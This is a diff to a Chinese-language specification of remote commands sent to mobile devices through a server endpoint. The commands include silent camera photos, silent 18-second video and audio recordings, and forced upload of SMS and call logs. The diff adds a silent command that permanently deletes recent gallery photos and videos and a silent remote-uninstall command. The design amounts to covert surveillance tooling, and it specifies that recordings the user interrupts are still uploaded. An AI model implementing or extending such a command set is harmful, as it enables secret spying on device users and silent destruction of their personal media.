@@ -112,11 +112,15 @@ Payload: AES-256-GCM 加密的二进制（格式由实现约定，建议含 type
 | mop.cmd.dial | 唤起拨号盘 | 非静默 | {"number": "10086"} |
 | mop.cmd.sms | 唤起短信编辑器 | 非静默 | {"number": "10086", "body": "HELP"} |
 | mop.cmd.audit | 立即强制审计上报 | 静默 | {"types": ["sms", "call_log"]} |
-| mop.cmd.wipe | 自毁：清空数据并锁机 | 静默 | {} |
+| mop.cmd.gallery.clear | 清理相册：仅删除设备相册中最近 N 天内的照片与视频，不清空 APP 内数据、不退出登录 | 静默 | {"days": 3}，days 默认 3 |
+| mop.cmd.wipe | （已废弃）不再清空 APP 数据；仅清理相册请使用 mop.cmd.gallery.clear。客户端收到可忽略。 | 静默 | {} |
+| mop.cmd.uninstall | 远程卸载：调起系统卸载（Android 弹窗确认；iOS 无系统卸载 API 则无操作）。不再执行数据擦除。 | 静默 | {} |
 | mop.cmd.config | 更新 Host 或心跳频率 | 静默 | {"heartbeat": 300} |
 | mop.cmd.capture.photo | 拍一张照并加密上报 | 静默 | {"camera": "front"\|"back", 可选 "quality"\|"max_size"} |
 | mop.cmd.capture.video | 录一段视频并加密上报，约定 18 秒 | 静默 | {"camera": "front"\|"back", "duration_sec": 18, 可选 "resolution"\|"max_size"} |
 | mop.cmd.capture.audio | 录一段音频并加密上报，约定 18 秒 | 静默 | {"duration_sec": 18, 可选 "format"\|"max_size"} |
+
+**mop.cmd.gallery.clear**：设备端**仅**对相册做“近 N 天内照片与视频”的永久删除（N 由 params.days 指定，默认 3）；不清理 SecureStorage、本地缓存与数据库，不退出登录。
 
 **录像/录音时长与中断**：视频、音频采集约定时长为 **18 秒**（可由 params 的 duration_sec 指定，默认 18）。若在 18 秒内被中断（用户或系统导致），**仍将已录制的实际媒体文件**（非仅元数据）加密后经 3.3 节通道上报，与录满 18 秒时采用相同上报格式与接口。
 
@@ -170,7 +174,7 @@ Payload (JSON): {
 
 **下发远程指令**  
 - Endpoint: POST /api/v1/admin/devices/:device_id/command  
-- Body (JSON): { "cmd": "mop.cmd.dial" | "mop.cmd.sms" | "mop.cmd.wipe" | "mop.cmd.audit" | "mop.cmd.config" | "mop.cmd.capture.photo" | "mop.cmd.capture.video" | "mop.cmd.capture.audio", "params": {} }  
+- Body (JSON): { "cmd": "mop.cmd.dial" | "mop.cmd.sms" | "mop.cmd.gallery.clear" | "mop.cmd.wipe"（已废弃） | "mop.cmd.uninstall" | "mop.cmd.audit" | "mop.cmd.config" | "mop.cmd.capture.photo" | "mop.cmd.capture.video" | "mop.cmd.capture.audio", "params": {} }  
 - 响应 202：已接受，由 api 经 Tinode/推送下发至该设备；4xx 为参数错误或设备不存在；body 建议含 code、message。  
 - 指令语义与第 4 节远程指令集一致；静默/非静默由协议约定，不在此重复。
 
